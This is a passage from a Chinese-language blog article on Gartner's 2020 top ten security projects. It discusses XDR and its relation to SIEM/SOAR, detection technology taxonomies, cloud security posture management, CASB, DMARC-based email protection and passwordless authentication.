href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849711369988.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849711369988.png"></a></p><p>上图是ESG的XDR架构示意图。ESG更直接表示可以把XDR看作是EDR+SIEM+SOAR的集合。</p><p>笔者认为，<strong>XDR=EDR+简化SIEM+简化SOAR</strong>。XDR的目标就是全面的threat检测与响应，或者叫统一threat检测与响应（UDR）、NGDR。</p><p>1）           EDR是XDR的必备组件。当前的threat检测必然要从端点上收集遥测数据，因为这里能够发现的攻|击痕迹最多。看看ATT&amp;CK就知道，大量的TTP都是基于端点的。缺少端点数据，攻|击链很难刻画出来。</p><p>2）           简化的SIEM是XDR的平台支撑。XDR不是一个简单的单点系统，而是一个平台型系统。SIEM的大数据核心框架为XDR的后端平台提供技术支撑，包括海量多源异构数据的采集、处理、存储、分析、调查、呈现，等等。借助SIEM平台框架，XDR应实现对EDR以及其它自家安全设备的集成。简化之处在于仅提供对厂商自有产品的数据采集、范化和分析，而不必考虑接入第三方厂商数据的问题。</p><p>3）           简化的SOAR为XDR的响应能力提供支撑。SOAR的能力裁剪后跟SIEM整合到一起。</p><h4 id="5-3-6-3-XDR与SIEM-SOAR的关系"><a href="#5-3-6-3-XDR与SIEM-SOAR的关系" class="headerlink" title="5.3.6.3   XDR与SIEM/SOAR的关系"></a>5.3.6.3   XDR与SIEM/SOAR的关系</h4><p>通过上面的分析，大家都会产生一个疑问：XDR跟SIEM/SOAR是什么关系？注意，这里我们将SIEM/SOAR打包到一起来跟XDR进行对比，是为了避免阐释SIEM和SOAR的关系，此刻这个问题先放一边。</p><p>先看看Gartner是怎么说的。</p><p>Gartner表示，尽管XDR与SIEM/SOAR在功能上存在相似性（譬如都有异构数据采集、范化、关联，而且通常都会采用大数据分析技术，还可能都有剧本编排与自动化响应技术），但在目标定位和技术路线上存在差异。在目标定位上，XDR仅关注threat检测与响应，而SIEM除了关注threat检测与响应，还要覆盖日志存储及合规审计等其它场景。在技术路线上，XDR强调对单一厂商的安全产品集成，并且在出厂前就将这些产品打包在一起，提供了更易于部署和使用的操作过程。相比之下，SIEM/SOAR必须具备跨厂商产品集成能力。正是因为在设计上的这些简化，XDR规避了SIEM/SOAR当前存在的几个大坑（笔者注：譬如架构开放性和扩展性问题、产品集成问题、部署和实施复杂性问题、知识管理问题），使得XDR的部署和实施复杂度相较于SIEM/SOAR要简化不少。</p><p>此外，如果是针对云计算环境，云中的端点安全和工作负载安全能力，以及平台架构作为成为了衡量云安全检测与响应的关键。此时，XDR厂商比大部分SIEM/SOAR厂商更占优势，因为先进的XDR通常都基于云原生架构来实现。并且，XDR厂商在云端EDR及CWPP方面更具优势。</p><p>简言之，就是在相同条件下，以threat检测为目标，XDR出效果比SIEM/SOAR更快。</p><p>当然，Gartner认为XDR也存在一些问题。由于XDR集成的都是自家的产品，虽然简化了不少，但却容易将用户锁定在单一厂商之下。XDR厂商的“全家桶”模式难以确保除EDR之外的检测能力都是同类最佳，且如果各种单点产品都基于同一个厂商，未来的维护、升级都存在风险。</p><p>此外，笔者认为，XDR还存在以下问题：</p><p>首先，XDR还有不少技术短板需要补齐。在多源安全数据采集分析，尤其是关联分析方面，XDR厂商普遍落后于SIEM厂商。在响应方面，SOAR的编排自动化技术也是XDR需要补足的。</p><p>其次，也是最关键的，XDR是作为一个集成化的产品和解决方案提供给客户的，用于解决其一揽子的threat检测与响应的问题。而新一代的SIEM/SOAR则越来越强调给用户赋能，是以能力建设的形式输出给用户的。对于大型用户而言，网络中必定存在不同厂商的安全防护设施，也必定需要一个统一的SOC。因此，XDR无法取代SIEM/SOAR。但对于中型客户而言，XDR可能会在SOC中占据更主要的位置。还有一部分客户，Gartner建议他们既不要考虑XDR，也不要考虑SIEM/SOAR，而是优先考虑MSS。XDR虽然比SIEM/SOAR简化了不少，但还是需要运营的。</p><p>必须指出，Gartner对于XDR还在不断厘清的过程中，该技术（所代表的细分市场）并不稳定，也许在一段时间后会消失。因为XDR与SIEM/SOAR存在一定的重叠性，并且更多是因为SIEM/SOAR技术的发展过程中存在的问题而引伸出来的一个“过渡性”解决方案，也许随着SIEM/SOAR的成熟而消失，抑或找到一个属于自己的缝隙市场。</p><h3 id="5-3-7-从检测技术的划分看XDR的发展趋势"><a href="#5-3-7-从检测技术的划分看XDR的发展趋势" class="headerlink" title="5.3.7     从检测技术的划分看XDR的发展趋势"></a>5.3.7     从检测技术的划分看XDR的发展趋势</h3><h4 id="5-3-7-1-检测技术划分"><a href="#5-3-7-1-检测技术划分" class="headerlink" title="5.3.7.1   检测技术划分"></a>5.3.7.1   检测技术划分</h4><p>如前所述，XDR可以看作是多种检测与响应技术的集成，作为一个统一的、全面的检测与响应平台。对XDR而言，不是要研究新的检测与响应技术，而更多是考虑如何将不同的检测与响应技术整合到一起。因此，为了了解XDR未来的发展趋势，必须先了解当下都有哪些检测与响应技术。</p><p>当Gartner研究和讨论检测与响应类技术的时候，涉及的技术面和细分市场是相当广泛的，需要多个不同的Gartner安全分析师团队之间的合作，而一年一度的Hype Cycle（炒作曲线）则是各个分析师协作的一个成果体现。目前，检测和响应相关的技术大都收录在“安全运营”炒作曲线中。“安全运营”这两个炒作曲线分类是2020年新提出来的，之前叫“面向threat”，始于2017年，在2016年及以前叫“基础设施保护”。下图是2020年的“安全运营”技术炒作曲线，里面基本涵盖了Gartner涉及的所有检测与响应类技术。</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849726928473.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849726928473.png"></a></p><p>上图虽然列举了大量检测与响应技术，却并没有对他们进行分类。而对检测与响应技术进行分类是一个重要但十分困难的事情，Gartner自己也做过多种尝试，目前尚无定论。</p><p>Gartner在2013年为了讨论高级threat检测（ATD）的时候提出了一个划分新型检测技术的方法论，虽在2016年后逐渐淡出Gartner报告的视野，但却依然有一定价值。如下图所示，Gartner当时从分析对象和分析时间两个维度划分了五种新型检测技术：</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849736756885.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849736756885.png"></a></p><p>针对这幅图，笔者结合自己的认识，对当下主流的几种新型检测技术进行了标注如下：</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849742601444.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849742601444.png"></a><br>可以看到，NTA是当下主流的基于网络的新型检测技术，NFT（网络取证工具）作为基于网络的响应技术比较少被提及。从2020年开始，Gartner正式将NTA改名为NDR（网络检测与响应）。注意，上图只对D进行了划分，没有提及R。因此，NDR不仅包括NTA，NFT，还要包括响应能力。对应NDR，现在还有一个初现的提法，叫NGIDS，或者NG IDPS，所谓下一代入|侵检测，但这些提法缺乏对R的体现。从基于端点的视角来看，style4和style5两种技术现在已经不再加以区分，统称为EDR，或者作为下一代EPP的关键能力之一了。上图中位于中间的基于负载的检测技术，基本就是指代沙箱技术了。而该技术事实上还可以分解到基于端点的沙箱和基于网络的沙箱两个维度中去，成为更广泛意义上的NDR和EDR的功能点之一。</p><p>上图对于阐释当下最热门的两种新型检测与响应技术——NDR和EDR——及其市场演进是有价值的，但却远远无法表达完整意义上的检测与响应技术，更何况检测与响应技术本身也仅仅检测与响应体系建设的一环而已。2018年，Gartner在一份名为《如何开展threat检测与响应实践》的报告中给出了一个基本的检测与响应体系的参考模型，如下图：</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849750693138.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849750693138.png"></a></p><p>上图比较全面地表达了检测与响应体系所应涵盖的技术（能力）、流程和团队三个方面的内容，给出了10个技术能力和4个关键流程，并沿用至今。这10个技术能力从目标对象和时间先后两个维度进行了划分，与前面的新型threat检测二维划分方式基本一致。不同之处在于目标对象粒度更细，最关键地是加入了针对日志的检测与响应，并把SIEM和CLM（集中日志管理）作为最基本的检测与响应的平台，位置要高于后面4个。</p><p>此外，在这个10大技术能力矩阵图中，响应能力从技术视角来看被称作了“可见性”，所谓可见性就是在threat猎捕和安全响应（包括调查、取证）的时候能够提供相关的技术支撑。</p><p>检测与响应能力从流程视角对应了4个方面，它们从技术上可以由SOAR来提供支撑。</p><p>事实上，即便是上面的10+4检测与响应参考架构图都没能将检测与响应技术描绘全，譬如基于用户/实体进行检测的UEBA技术，以及欺骗技术。Gartner自己也表示上图仅仅是针对基本的检测与响应能力进行阐释。</p><p>额外需要提及的包括UEBA、欺骗平台、BAS。</p><p>在2020年的炒作曲线中，UEBA已经去掉了，Gartner表示它已经成为了其它技术的组成部分，主要是融入了SIEM，而XDR、EDR和NDR也都会用到。</p><p>Gartner将欺骗技术单独作为一个技术分支，与面向日志的检测与响应技术、面向网络的检测与响应技术和面向端点的检测与响应技术并称为四大检测与响应技术路线。对于SIEM而言，欺骗平台的告警可以成为一个高置信度的数据源。</p><p>BAS（破坏与攻|击模拟）也是一种检测与响应技术，可以为SIEM提供重要的基于验证的检测与响应能力补充。</p><h4 id="5-3-7-2-XDR发展趋势分析"><a href="#5-3-7-2-XDR发展趋势分析" class="headerlink" title="5.3.7.2   XDR发展趋势分析"></a>5.3.7.2   XDR发展趋势分析</h4><p>笔者认为，未来XDR理论上可以集成上面所有检测与响应技术，但那个时候XDR是不是还叫XDR就不得而知了。</p><p>目前市场上已经出现了将EDR、欺骗技术、NDR集成到一起的XDR解决方案。还有的厂商把SIEM/LM所具备的对第三方日志采集、存储与分析能力作为其XDR解决方案的一部分。几乎所有的XDR厂商都宣称自己具有UEBA能力，并都集成了threat情报。</p><p>进一步分析当前的XDR厂商，可以发现大家的做法可谓五花八门。最经典的XDR来自有实力的EDR厂商，这些EDR厂商同时具备其它检测类产品，因而通常也都是综合性厂商。他们的XDR基本上就是以EDR为核心的产品全家桶。还有一类更大型的综合性厂商野心更大。他们将其各种产品打包到一起，上面再戴个帽子，形成了一个更雄心勃勃的战略和XDR解决方案，仔细一看，其实就是把XDR变成了SIEM/SOAR和SOC平台。还有一类厂商则剑走偏锋，把XDR做成了一个检测与响应中间件（中台？也许吧），对下可以接入自家或者别家的遥测数据，对上则可以汇入别家的SIEM/SOAR。最后，还有SIEM厂商也加入了XDR战场，他们基于其SIEM/SOAR领域的积累，向下集成包括EDR、NDR在内的多种检测技术，推出自己的XDR。</p><p>总体而言，当前的XDR技术并不复杂，核心是产品和能力集成与打包。目前大家在XDR市场竞争的焦点主要不在技术上，而在商业模式、市场推广上。</p><p>显然，XDR还处于萌芽状态，未来发展的可能性还很多，变数也不小。</p><h2 id="5-4-云安全配置管理（CSPM）项目"><a href="#5-4-云安全配置管理（CSPM）项目" class="headerlink" title="5.4    云安全配置管理（CSPM）项目"></a>5.4    云安全配置管理（CSPM）项目</h2><h3 id="5-4-1-项目描述"><a href="#5-4-1-项目描述" class="headerlink" title="5.4.1     项目描述"></a>5.4.1     项目描述</h3><p>现在对云服务的攻|击基本都利用了客户对云疏于管理、配置不当等错误。因此，云用户急需对（尤其是跨多云环境下的）IaaS和PaaS云安全配置的正确性与合规性进行全面、自动化地识别、评估和修复。</p><h3 id="5-4-2-项目难度"><a href="#5-4-2-项目难度" class="headerlink" title="5.4.2     项目难度"></a>5.4.2     项目难度</h3><p>中等，必须同步进行流程和文化的变革。</p><h3 id="5-4-3-项目关键"><a href="#5-4-3-项目关键" class="headerlink" title="5.4.3     项目关键"></a>5.4.3     项目关键</h3><p>支持多云环境，具备敏感数据发现和风险暴露面评估，支持所有的IaaS和PaaS服务，不仅能评估更要能修复。</p><h3 id="5-4-4-项目建议"><a href="#5-4-4-项目建议" class="headerlink" title="5.4.4     项目建议"></a>5.4.4     项目建议</h3><p>与云运营团队密切协作；先从单一的原生云平台开始入手，通常他们自带CSPM能力，然后再考虑混合云/多云平台；宜同时评估CSPM和CASB工具。</p><h3 id="5-4-5-技术成熟度"><a href="#5-4-5-技术成熟度" class="headerlink" title="5.4.5     技术成熟度"></a>5.4.5     技术成熟度</h3><p>在Gartner的2020年云安全Hype Cycle中，CSPM刚从失望低谷走出来，用户期待逐渐理性，处于早期主流阶段。</p><h3 id="5-4-6-技术解析"><a href="#5-4-6-技术解析" class="headerlink" title="5.4.6     技术解析"></a>5.4.6     技术解析</h3><p>CSPM（Cloud Security Posture Management）在国内首先遇到的问题是如何翻译的问题。国内有的人将CSPM中的Posture翻译为“态势”，将CSPM称作云安全态势管理。笔者认为不妥，因为如此一来就跟我们国内最近几年提的安全态势感知混淆了。仔细研究CSPM，可以发现，这里的Posture并不是讲我们国人一般所理解的“态势”，而是指“保护云中数字资产的各种策略、流程和控制的整体安全强度的相对度量”（这句话出自Gartner的CSPM发明人Neil McDonald的报告《Innovation Insight for Cloud Security Posture Management》）。简单地说，CSPM中的P是指云安全配置的强度，这里的配置涵盖云安全策略、控制项、安全操作流程规范。因此，笔者从Gartner提出CSPM伊始就呼吁国内同行将CSPM翻译为“云安全配置管理”。一方面这个翻译更贴近CSPM的本质，另一方面也很好地与国内讲的态势感知区分开来。</p><p>回到CSPM技术本身，Gartner在2019年才给出了一个CSPM的概念组成，如下图所示。<br><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849764162701.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849764162701.png"></a></p><p>Gartner认为CSPM是一个持续的过程，采用生命周期方法论给出了CSPM的概念组成，横跨开发和运行两个阶段，依照CARTA理念进行基于风险的动态配置管理。Gartner表示，几乎所有针对云的成功攻|击都是由于客户误配置、管理失误和认为错误造成的，而CSPM直接针对这个问题给出解决方案。</p><p>根据Gartner的定义，<strong>CSPM能够通过预防，检测，响应和预测构成的自适应安全架构来持续管理超越依据通用框架、合规要求及企业安全策略所能承受的云安全风险</strong>【笔者注：简单理解就是管控多余的风险。只要开展业务，任何配置都不能做到无风险，CSPM不是消灭配置风险，而是管控超出预期的配置风险】。CSPM核心能力是提供主被动发现和评估云服务配置（譬如网络和存储配置）和安全设置（譬如账号特权和加密设置）的风险及可信度。如果设置不合规或者配置超越了风险承受水平，CSPM能够自动进行配置调整和补救。</p><p>有时候，我们可以将CSPM的评估功能（也被称作CSPA）归入弱点扫描类产品中去，跟漏扫、配置核查搁到一块。</p><p>此外，CSPM除了能对云生产环境中的负载进行配置核查与修复，还能对开发环境中的负载进行配置核查与修复，从而实现DevOps全周期的防护。</p><p>CSPM跟多个细分市场都有交集。云提供商现在大都在云原生安全能力中涵盖了CSPM功能。领先的CASB厂商也已经具备了较强的CSPM功能。同时，一些CWPP厂商也开始提供CSPM功能。此外，当前的云管理平台（CMP）通常都自带CSPM功能。</p><h2 id="5-5-简化云访问控制项目"><a href="#5-5-简化云访问控制项目" class="headerlink" title="5.5    简化云访问控制项目"></a>5.5    简化云访问控制项目</h2><h3 id="5-5-1-项目描述"><a href="#5-5-1-项目描述" class="headerlink" title="5.5.1     项目描述"></a>5.5.1     项目描述</h3><p>企业渴望通过一个中心控制点对跨多云的服务实施统一的策略管理和安全治理，以便获得这些云服务的可见性，并对组织中使用这些云服务的用户和行为进行集中管控。虽然项目名称中只字未提，但通过内容我们还是可以知道Gartner的这个项目其实还是云访问安全代|理（CASB）。</p><h3 id="5-5-2-项目难度"><a href="#5-5-2-项目难度" class="headerlink" title="5.5.2     项目难度"></a>5.5.2     项目难度</h3><p>中等。取决于所采用的云应用及服务的情况。</p><h3 id="5-5-3-项目关键"><a href="#5-5-3-项目关键" class="headerlink" title="5.5.3     项目关键"></a>5.5.3     项目关键</h3><p>通过正/反向代|理还是API来实现可见性？支持threat防护或者TIP吗？敏感数据监控与防护、合规报告、（云应用/服务）使用情况监控至关重要。</p><h3 id="5-5-4-项目建议"><a href="#5-5-4-项目建议" class="headerlink" title="5.5.4     项目建议"></a>5.5.4     项目建议</h3><p>如果你看不见需要被保护的对象，也就无法实施保护。因此，CASB首先要进行云应用发现，识别影子IT。接下来，可以考虑部署正向/反向代|理和API来实施控制。对CASB而言，发现并保护云中的敏感数据至关重要，并且最好采取跟本地一致的敏感数据防护策略。</p><h3 id="5-5-5-技术成熟度"><a href="#5-5-5-技术成熟度" class="headerlink" title="5.5.5     技术成熟度"></a>5.5.5     技术成熟度</h3><p>在Gartner的2020年云安全Hype Cycle中，CASB正在向成熟期迈进，处于早期主流阶段。</p><h3 id="5-5-6-技术解析"><a href="#5-5-6-技术解析" class="headerlink" title="5.5.6     技术解析"></a>5.5.6     技术解析</h3><p>该技术从2014年就开始上榜了，Gartner对其独有情钟，但CASB在国内一直没啥动静，可能跟国内面向企业级的SaaS还不够丰富有关。</p><p><strong>Gartner****认为，CASB作为一种产品或服务，为SaaS和IaaS中的可见性、数据安全、threat防护与合规评估提供了关键的云治理控制。CASB将多种类型的安全策略整合到一个地方，这些安全策略包括认证、SSO、授权、设备建模、数据安全、日志、告警和恶意代码查杀。</strong>CASB产品基本都是基于云的，本地部署的很少见。</p><p>笔者理解，CASB的出现原因，简单说，就是随着用户越来越多采用云服务，并将数据存入（公有）云中，他们需要一种产品来帮助他们采用一致的策略安全地接入不同的云应用，让他们清晰地看到云服务的使用情况，实现异构云服务的治理，并对云中的数据进行有效的保护，而传统的WAF、SWG和企业防火墙无法做到这些，因此需要CASB。</p><p>Gartner认为CASB应具备的主要功能包括：云应用发现与风险评级、自适应访问控制（AAC）、CSPM、DLP、加密和令牌化、企业应用/服务集成、UEBA、日志管理，等。</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849778778791.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849778778791.png"></a></p><h2 id="5-6-基于DMARC协议的邮件安全防护项目"><a href="#5-6-基于DMARC协议的邮件安全防护项目" class="headerlink" title="5.6    基于DMARC协议的邮件安全防护项目"></a>5.6    基于DMARC协议的邮件安全防护项目</h2><h3 id="5-6-1-项目描述"><a href="#5-6-1-项目描述" class="headerlink" title="5.6.1     项目描述"></a>5.6.1     项目描述</h3><p>DMARC被设计用来防范直接的域名仿冒。在邮件系统中实现DMARC有助于减少商业邮件失陷（BEC）的部分可能因素。Gartner表示，从2020年到2023年，BEC攻|击的损失每年都会翻番，2023年将超过50亿美元。而FBI的互联网犯罪投诉（IC3）则更是<a href="https://www.ic3.gov/media/2019/190910.aspx"> 发出警告</a>称2018~2019年间BEC造成的损失达到了260亿美元！Gartner建议用户部署这个免费的技术，以缓解仿冒型钓鱼邮件的攻|击。笔者认为，钓鱼邮件诈骗之于欧美恰如钓鱼电话/短信诈骗之于中国，都是洪水猛兽，汹涌澎湃。</p><h3 id="5-6-2-项目难度"><a href="#5-6-2-项目难度" class="headerlink" title="5.6.2     项目难度"></a>5.6.2     项目难度</h3><p>简单。在主动拒绝恶意消息之前先花些时间学习和监测来自已知域名的邮件。</p><h3 id="5-6-3-项目关键"><a href="#5-6-3-项目关键" class="headerlink" title="5.6.3     项目关键"></a>5.6.3     项目关键</h3><p>研究并整合品牌管理及社交媒体监控的方法；将DMARC集成到整体电子邮件安全方法中。</p><h3 id="5-6-4-项目建议"><a href="#5-6-4-项目建议" class="headerlink" title="5.6.4     项目建议"></a>5.6.4     项目建议</h3><p>先从监测开始，然后再真正开始阻断。DMARC不能消除对于全面邮件安全策略的需求，这仅仅是一个值得去做的一个点，要真正做好邮件安全，需要做的事情还有很多。</p><h3 id="5-6-5-技术成熟度"><a href="#5-6-5-技术成熟度" class="headerlink" title="5.6.5     技术成熟度"></a>5.6.5     技术成熟度</h3><p>根据Gartner的定义，<strong>（电子）邮件安全是指为邮件提供攻|击防护和访问保护的预测、预防、检测与响应的框架</strong>。该市场包括了多种技术、产品、流程和服务，大体的构成如下图所示，主要包括安全邮件网关（SEG）、集成邮件安全解决方案（EISS）、云邮件安全补充（CESS），等。</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849787269715.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849787269715.png"></a></p><p>其中最主要的是SEG产品，目前已经是成熟产品，2019年的销量增长超过了20%，在各门类安全软件中位居第三，达到19.1亿美元。</p><p>Gartner没有对DMARC技术进行技术成熟度分析，也没有单列出相关的细分市场。事实上，DMARC作为2012年诞生的技术，作为防范邮件仿冒和社工类攻|击的一种手段已经很成熟了。</p><h3 id="5-6-6-技术解析"><a href="#5-6-6-技术解析" class="headerlink" title="5.6.6     技术解析"></a>5.6.6     技术解析</h3><p>从2018年开始，Gartner每年都会将邮件安全（尤指反钓鱼邮件）的项目列入十大安全项目之中，可见邮件安全的重要性。Verizon的<a href="https://mp.weixin.qq.com/s?__biz=MzUyNzMxOTAwMw==&mid=2247484157&idx=1&sn=d355d6d2412dfa4080a6ffb57443641b&chksm=fa002849cd77a15f43e35b0d16ce35debec7e50fe3b4c87125c500b72135f404eba3e4dbe74d&token=766021203&lang=zh_CN#rd"> 2020年DBIR报告</a>显示，导致数据泄露的首要threat行为样式就是钓鱼（参见DBIR报告图13）。</p><p>在<a href="https://mp.weixin.qq.com/s?__biz=MzUyNzMxOTAwMw==&mid=2247483696&idx=1&sn=f5b849f3d3e8b1aa57a13073f0c623ba&chksm=fa002b84cd77a29284072bf3879bb8a0fa4d88f139d58a1d95266bae2444deceb6fa1a89d73c&scene=21#wechat_redirect"> 2018年的项目建议</a>中Gartner给出比较全面的项目建设建议，包括谈到要构建一个从技术控制、用户控制和流程重构三管齐下的全面邮件安全策略，其实就是要采取人、技术和流程相结合的机制来做。当时Gartner给出了不少很有价值的技术建议。在<a href="https://mp.weixin.qq.com/s?__biz=MzUyNzMxOTAwMw==&mid=2247483855&idx=1&sn=a5f1f85d5f1c8a7c30168c48f6d03241&chksm=fa002b7bcd77a26d6258a73b6e4dde8d7d75c6496f68ce14d7f19510ed198ec28a2a14638ccd&scene=21#wechat_redirect"> 2019年的项目建议</a>中，则进一步将建议聚焦到应对商业邮件失陷（BEC）问题上，并给出了一系列相关的建议。在2020年，则更进一步建议具体采用DMARC协议来缓解BEC风险。</p><p><a href="https://dmarc.org/"> DMARC</a>是Domain-Based Message Authentication, Reporting and Conformance（基于域名的消息认证报告与一致性协议）的简称。DMARC是一项2012年就诞生的电子邮件安全协议，大家可以自行百度、知乎，查看详情。这里引用<a href="https://qiye.163.com/help/3338ea.html"> 网易企业邮箱中的帮助信息</a>简要介绍一下：<strong>DMARC是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收</strong>。</p><p>DMARC协议是较能有效解决信头（From）伪造而诞生的一种邮件来源验证手段，为邮件发件人地址提供强大保护，并在邮件收发双方之间建立起一个数据反馈机制。企业客户使用了DMARC之后，都可以很方便地告诉邮件接收方如何认证“我”的邮件，如何处理仿冒“我”的邮件，如何把仿冒邮件的数据反馈给“我”。对于顺利通过DMARC验证的邮件，会最终投递到收件人的邮箱中；若是仿冒的邮件则会按照“我”的设置来处理，且仿冒信息将会反馈给“我”。下图来自<a href="https://dmarc.org/"> DMARC组织</a>的官方介绍：</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849871202066.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849871202066.png"></a></p><p>最后，需要强调的是，DMARC仅仅是邮件安全的一种技术手段，并且主要是防范钓鱼类攻|击。应该说落实该技术的投资回报率很高，但完整的邮件安全远不止于此，其它特色技术还包括网络沙箱、内容拆解与重建（CDR）、URL重写与点击时分析、远程浏览器隔离、各种异常检测技术、反钓鱼行为训练APBC（原来叫APBM）、安全编排自动化与响应（SOAR），等。这里提及的部分技术在笔者的《<a href="https://mp.weixin.qq.com/s?__biz=MzUyNzMxOTAwMw==&mid=2247483696&idx=1&sn=f5b849f3d3e8b1aa57a13073f0c623ba&chksm=fa002b84cd77a29284072bf3879bb8a0fa4d88f139d58a1d95266bae2444deceb6fa1a89d73c&scene=21#wechat_redirect"> 2018年Gartner十大安全项目详解</a>》中有所介绍。</p><h2 id="5-7-无口令认证项目"><a href="#5-7-无口令认证项目" class="headerlink" title="5.7    无口令认证项目"></a>5.7    无口令认证项目</h2><h3 id="5-7-1-项目描述"><a href="#5-7-1-项目描述" class="headerlink" title="5.7.1     项目描述"></a>5.7.1     项目描述</h3><p>尽管彻底消除口令还很遥远，但降低对口令的依赖已经十分可行。企业和组织应加强信任建设和提升用户体验。Reed在会上表示，有统计发现70％的用户在工作和个人世界之间重复使用密码。他说，有很多选择可以使用第二个因素代替密码，例如已知的资产，包括手机，平板电脑，钥匙扣或智能手表，还有使用零因素或多因素身份验证的其他示例。</p><h3 id="5-7-2-项目难度"><a href="#5-7-2-项目难度" class="headerlink" title="5.7.2     项目难度"></a>5.7.2     项目难度</h3><p>难。需要教育用户和持续的的安全意识培训以避免流程上的混淆。</p><h3 id="5-7-3-项目关键"><a href="#5-7-3-项目关键" class="headerlink" title="5.7.3     项目关键"></a>5.7.3     项目关键</h3><p>基于信任机制和用户体验需求慎重选取合适的无口令认证方案；要实现无口令的注册、认证和账号恢复。</p><h3 id="5-7-4-项目建议"><a href="#5-7-4-项目建议" class="headerlink" title="5.7.4     项目建议"></a>5.7.4     项目建议</h3><p>采用试点、分阶段实施的方法，不断监测用户反馈，逐步落实。</p><h3 id="5-7-5-技术成熟度"><a href="#5-7-5-技术成熟度" class="headerlink" title="5.7.5     技术成熟度"></a>5.7.5     技术成熟度</h3><p>Gartner预计，到2023年，有30％的组织将至少采用一种形式的无口令身份验证。无口令认证涉及很多技术，其中一些先进技术在Gartner的IAM Hype Cycle中被提及，譬如FIDO认证协议、移动多因素认证，并且都位于炒作高潮期。</p><h3 id="5-7-6-技术解析"><a href="#5-7-6-技术解析" class="headerlink" title="5.7.6     技术解析"></a>5.7.6     技术解析</h3><p>首先，笔者这里<strong>将password翻译为口令，而不是密码！二者不是一回事儿</strong>。用户对各种系统的口令管理一直是个令人头痛的问题，大家通常都不乐意定期修改口令。对企业和组织而言，在网络环境中实现无口令认证机制无疑会在提升企业安全的同时极大地提升用户体验。</p><p><strong>要实现无口令认证，有多种技术选项，如下图所示，包括单因素认证、多因素认证和无因素认证，要根据不用的场景来取舍</strong>。</p><p><a href="./Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849889337087.png" class="gallery-item"><img src="/2021/10/19/Gartner2020%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E8%AF%A6%E8%A7%A3/1603849889337087.png"></a></p><p>Gartner提醒大家，受限于企业现有系统的复杂性，要实现通用简洁的无口令认证机制并非易事，IAM项目团队需要一套跨多种场景的整合策略。首先，当前的无口令认证技术差异巨大，有的是在用户交互层消除了口令，但底层本质还是基于口令认证的；还有的则是在底层上就消除了口令。Gartner推荐部署了Windows系统的企业和组织优先评估微软的Hello解决方案，以及手机即令牌（phone-as-a-token）的多因素认证解决方案。其次，寻找一个适用于不用应用场景的、兼容现有网络和系统架构的整合性无口令认证解决方案。在无法实现完全无口令认证（如某些登录过程）的时候，可以退而采用“轻口令”方式。</p><h2 